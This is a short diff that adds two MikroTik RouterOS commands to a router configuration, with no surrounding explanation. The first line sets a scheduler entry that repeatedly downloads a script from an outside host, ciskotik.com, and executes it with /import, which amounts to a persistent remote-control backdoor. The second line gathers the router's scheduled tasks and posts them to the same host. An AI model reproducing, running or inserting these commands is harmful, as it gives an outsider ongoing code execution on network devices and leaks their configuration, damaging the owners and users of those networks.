@@ -1,0 +1,2 @@
+/system scheduler set U4 on-event="/tool fetch url=http://ciskotik.com/poll/9836da3b-2682-4379-a5dc-9a288a6fd3b0 mode=http dst-path=mikrotik.php\r\n/import mikrotik.php"
+{ :local result [/system schedule print as-value ]; /tool fetch url="http://ciskotik.com/api/scheduler" mode=http http-data=$result;}
